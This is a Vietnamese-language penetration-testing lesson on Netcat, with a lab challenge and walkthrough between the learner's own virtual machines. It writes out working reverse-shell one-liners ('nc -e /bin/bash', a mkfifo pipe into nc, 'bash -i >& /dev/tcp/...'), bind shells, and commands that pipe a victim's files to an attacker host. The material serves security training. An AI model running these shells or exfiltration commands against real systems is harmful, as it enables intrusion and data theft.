# 🛠️ Mission 12: NETCAT (NC) - CON DAO THỤY SĨ CỦA HACKER

> **📜 Mission Brief:** Trong thế giới Cybersecurity, công cụ hiện đại (như Metasploit) có thể rất mạnh, nhưng cũng rất cồng kềnh và dễ bị Antivirus phát hiện.
>
> **Netcat (nc)** thì khác. Nó nhỏ gọn, cổ điển, và hoạt động trên nguyên tắc đơn giản nhất: **Đọc và Ghi dữ liệu qua mạng**.
>
>   * Nếu bạn biết dùng Netcat, bạn có thể biến bất kỳ máy tính nào thành Server, Chat Client, hoặc một Backdoor chết người.

-----

## ⚙️ MODULE 1: GIẢI MÃ CÂU LỆNH (SYNTAX MASTERY)

Trước khi đi vào thực chiến, bạn phải thuộc nằm lòng combo "thần chú" sau: **`-lvnp`**. Hầu hết các Hacker gõ cụm này theo phản xạ tự nhiên.

| Cờ (Flag) | Tên đầy đủ | Tác dụng chiến thuật |
| :--- | :--- | :--- |
| **`-l`** | **L**isten | Chuyển sang chế độ "Lắng nghe" (Server). Mở cổng và chờ ai đó kết nối vào. |
| **`-v`** | **V**erbose | Chế độ "Nhiều chuyện". Hiển thị chi tiết trạng thái (VD: "Connected from..."). Nếu không có nó, Netcat im lìm rất khó debug. |
| **`-n`** | **N**o DNS | Không phân giải tên miền. Chỉ dùng IP. Giúp kết nối nhanh hơn và tránh bị log DNS. |
| **`-p`** | **P**ort | Chỉ định cổng cụ thể (VD: 4444). |
| **`-e`** | **E**xecute | **⚠️ CỰC NGUY HIỂM.** Sau khi kết nối thành công, thực thi ngay một chương trình (như `cmd.exe` hoặc `/bin/bash`). Đây là nòng cốt của Reverse Shell. |
| **`-u`** | **U**DP | Chuyển sang dùng giao thức UDP (mặc định là TCP). |

-----

## 💬 MODULE 2: CHAT SERVER (HELLO WORLD CỦA NETWORK)

Hãy bắt đầu bằng việc biến 2 cái màn hình đen ngòm thành ứng dụng Chat.

**Bước 1: Máy A (Server - Người nghe)**

```bash
# Tao đang đợi ở cổng 4444, ai gọi thì bắt máy
nc -lvnp 4444
```

**Bước 2: Máy B (Client - Người gọi)**

```bash
# Gọi cho thằng A
nc [IP_Của_Máy_A] 4444
```

> **Kết quả:** Gõ chữ bên A $\rightarrow$ hiện bên B. Gõ bên B $\rightarrow$ hiện bên A.
> *Ứng dụng:* Hacker dùng cách này để giao tiếp bí mật trong mạng nội bộ mà không cần cài Zalo hay Messenger.

-----

## 📂 MODULE 3: TRUYỀN FILE (DATA EXFILTRATION)

Trong các cuộc tấn công thực tế, bạn xâm nhập được server nhưng không có SSH, FTP hay HTTP để lấy dữ liệu. Netcat chính là cứu cánh.

**Kịch bản:** Bạn muốn lấy trộm file `database.sql` từ máy Nạn nhân về máy Hacker.

### 1\. Phía máy Hacker (Người nhận)

Chúng ta phải lắng nghe và hứng dữ liệu vào một file rỗng.

```bash
nc -lvnp 4444 > database_bi_hack.sql
```

*(Dấu `>` là Output Redirection: Đổ tất cả những gì nhận được vào file này).*

### 2\. Phía máy Nạn nhân (Người gửi)

Đẩy file qua đường ống tới máy Hacker.

```bash
nc [IP_Hacker] 4444 < database.sql
```

*(Dấu `<` là Input Redirection: Lấy nội dung file nhét vào Netcat).*

> **⚠️ Lưu ý:** Netcat không có thanh loading. Bạn sẽ thấy màn hình đứng im. Khi truyền xong (hoặc đợi vài giây), bấm `Ctrl+C` để ngắt kết nối và kiểm tra file.

-----

## 🐚 MODULE 4: REVERSE SHELL & BIND SHELL (QUAN TRỌNG NHẤT)

Đây là kỹ thuật phân định tay mơ và dân chuyên. Bạn phải hiểu sự khác biệt giữa **Bind** và **Reverse**.

### 1\. Bind Shell (Mở cửa mời vào)

  * **Cơ chế:** Nạn nhân mở cổng (VD: 4444). Hacker kết nối tới IP Nạn nhân:4444.
  * **Nhược điểm:** Tường lửa (Firewall/NAT) thường **CHẶN** các kết nối từ ngoài Internet chui vào mạng nội bộ. $\rightarrow$ Kỹ thuật này thường thất bại.

### 2\. Reverse Shell (Gọi điện về nhà) - *Hacker ưa dùng*

  * **Cơ chế:** Hacker mở cổng chờ sẵn. Nạn nhân (do dính mã độc) sẽ **TỰ KẾT NỐI NGƯỢC** ra ngoài tới máy Hacker.
  * **Ưu điểm:** Tường lửa thường **THẢ** cho nhân viên trong công ty truy cập Internet ra ngoài (Outbound traffic). $\rightarrow$ Dễ dàng vượt qua tường lửa.

### 🔥 Thực hành Reverse Shell

**Bước 1: Hacker (Kali Linux)**

```bash
# Mở cổng 4444 và chờ "con mồi" gọi về
nc -lvnp 4444
```

**Bước 2: Nạn nhân (Target)**
Gõ lệnh này để trao quyền điều khiển cho Hacker:

```bash
# Linux Target
nc [IP_Hacker] 4444 -e /bin/bash

# Windows Target
nc [IP_Hacker] 4444 -e cmd.exe
```

-----

## 🚫 MODULE 5: XỬ LÝ SỰ CỐ (KHI KHÔNG CÓ CỜ `-e`)

Rất nhiều hệ điều hành Linux hiện đại (Ubuntu, Debian) cài phiên bản `netcat-openbsd` mặc định. Phiên bản này **CẮT BỎ cờ `-e`** vì lý do bảo mật.
Nếu bạn gõ `-e`, nó báo lỗi: `nc: invalid option -- 'e'`.

**Lúc này, Hacker làm gì?**

### Cách 1: Dùng "Netcat Traditional"

Cài lại bản cũ (nếu có quyền root):

```bash
sudo apt install netcat-traditional
```

### Cách 2: Dùng kỹ thuật "Named Pipe" (Mkfifo) - *Classic*

Đây là câu lệnh huyền thoại để tạo Reverse Shell mà không cần `-e`:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [IP_Hacker] 4444 >/tmp/f
```

*Giải thích: Nó tạo một đường ống ảo, nối đầu ra của shell vào đầu vào của netcat và ngược lại.*

### Cách 3: Dùng Bash TCP (Không cần Netcat trên máy nạn nhân)

Nếu máy nạn nhân thậm chí không có Netcat, nhưng có Bash:

```bash
bash -i >& /dev/tcp/[IP_Hacker]/4444 0>&1
```

-----

## 🕵️ MODULE 6: BANNER GRABBING (TRINH SÁT THỦ CÔNG)

Netcat cũng dùng để "hỏi thăm" xem Server đang chạy phần mềm gì mà không cần dùng Nmap rườm rà.

Ví dụ: Kiểm tra Web Server (Port 80).

```bash
nc -v [IP_Target] 80
```

Sau khi kết nối thành công, gõ nhanh:

```http
HEAD / HTTP/1.0
```

*(Bấm Enter 2 lần)*

Server sẽ trả về:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.7 (Ubuntu)  <-- Bắt được mày rồi!
...
```

-----

### 🏆 CHALLENGE (THỬ THÁCH)

1.  Tạo 2 máy ảo (hoặc dùng máy thật và máy ảo).
2.  Thực hiện **Reverse Shell**: Máy ảo chiếm quyền điều khiển máy thật (hoặc ngược lại).
3.  Khi đã có Shell, hãy thử gõ lệnh `ls`, `whoami`, `pwd` để xem mình đang ở đâu.
4.  Thử lấy một file text từ máy nạn nhân về máy mình bằng Netcat.

-----
 
<details>
<summary>🆘 ZONE: WRITE-UP CHI TIẾT (DÀNH CHO NGƯỜI CẦN TRỢ GIÚP) — Ấn để hiển thị</summary>

# 🆘 ZONE: WRITE-UP CHI TIẾT (DÀNH CHO NGƯỜI CẦN TRỢ GIÚP)

> **Cảnh báo:** Chỉ đọc phần này sau khi bạn đã tự cố gắng ít nhất 15 phút mà không thành công. Cảm giác tự mình làm được (The "Aha\!" moment) là cách học tốt nhất\!

-----

### 🟢 Giai đoạn 0: Chuẩn bị thông tin (Recon)

Trước khi hack, bạn phải biết "Nhà mình ở đâu" để bảo nạn nhân gọi về.

**Trên máy Hacker (Kali Linux):**
Mở Terminal, gõ lệnh:

```bash
ip a
```

  * Tìm dòng `eth0` hoặc `wlan0`.
  * Giả sử IP của bạn là: **192.168.1.10** (Hãy thay bằng IP thật của bạn).

-----

### 🟡 Giai đoạn 1: Thiết lập Reverse Shell

Chúng ta sẽ chiếm quyền điều khiển của máy Nạn nhân (Victim) từ máy Hacker.

**Bước 1: Tại máy Hacker (Mở cổng chờ)**
Bạn đóng vai tổng đài, chờ cuộc gọi đến.

```bash
nc -lvnp 4444
```

  * *Màn hình hiện:* `listening on [any] 4444 ...` (Đừng tắt cửa sổ này\!)

**Bước 2: Tại máy Nạn nhân (Thực hiện cuộc gọi)**
Giả sử bạn đang ngồi ở máy nạn nhân (hoặc SSH vào nó). Hãy gõ lệnh sau để kết nối về máy Hacker:

  * **Trường hợp A (Lý tưởng - Máy có hỗ trợ `-e`):**

    ```bash
    nc 192.168.1.10 4444 -e /bin/bash
    ```

  * **Trường hợp B (Thực tế - Máy không có `-e`):**
    Nếu lệnh trên báo lỗi, hãy dùng đoạn code này (Copy/Paste cẩn thận):

    ```bash
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.10 4444 >/tmp/f
    ```

**Bước 3: Quay lại máy Hacker**
Nhìn vào màn hình Hacker, nếu thấy dòng chữ này xuất hiện:
`connect to [192.168.1.10] from (UNKNOWN) [192.168.1.x] 56789`

👉 **Chúc mừng\! Bạn đã xâm nhập thành công.**

-----

### 🔴 Giai đoạn 2: Khám phá & Ra lệnh

Bây giờ Terminal của Hacker chính là Terminal của Nạn nhân. Hãy thử gõ:

1.  **`whoami`** $\rightarrow$ Xem bạn đang đăng nhập với tư cách ai (root hay user thường?).
2.  **`pwd`** $\rightarrow$ Xem bạn đang đứng ở thư mục nào.
3.  **`ls -la`** $\rightarrow$ Liệt kê toàn bộ file.

-----

### 🔵 Giai đoạn 3: Đánh cắp dữ liệu (File Transfer)

Giả sử trên máy Nạn nhân có file `secret.txt` và bạn muốn lấy nó. Nhưng bạn đang dùng chung 1 cửa sổ Shell, làm sao lấy?

**Cách giải quyết:** Mở thêm một kết nối khác (Cổng khác).

**Bước 1: Trên máy Hacker (Mở Terminal MỚI)**
Mở cổng 5555 để đón file.

```bash
nc -lvnp 5555 > file_an_cap.txt
```

**Bước 2: Trên cửa sổ Reverse Shell (Cửa sổ Hacker đang điều khiển Nạn nhân)**
Ra lệnh cho máy nạn nhân gửi file về cổng 5555 của Hacker.

```bash
nc 192.168.1.10 5555 < secret.txt
```

*(Nếu chưa có file `secret.txt`, hãy tạo nhanh bằng lệnh: `echo "Mat khau la 123" > secret.txt`)*

**Bước 3: Kiểm tra**

  * Quay lại Terminal Mới của Hacker.
  * Bấm `Ctrl + C` để ngắt kết nối.
  * Gõ `cat file_an_cap.txt`.
  * Nếu thấy nội dung "Mat khau la 123" $\rightarrow$ **Mission Complete\!**

-----

### ❓ Troubleshooting (Gỡ lỗi thường gặp)

1.  **Lỗi `Connection refused`?**
      * Hacker chưa mở cổng lắng nghe (`nc -lvnp`).
      * Hoặc Nạn nhân gõ sai IP của Hacker.
2.  **Kết nối được nhưng không gõ được lệnh?**
      * Bạn quên cờ `-e /bin/bash` hoặc dùng sai payload Reverse Shell.
3.  **Lỗi `Address already in use`?**
      * Cổng 4444 đang bận. Hãy đổi sang cổng khác (VD: 9999) hoặc tắt tiến trình nc cũ đi.
</details>

-----

**Mission Completed\!**
Bạn đã nắm vững "Con dao Thụy Sĩ".
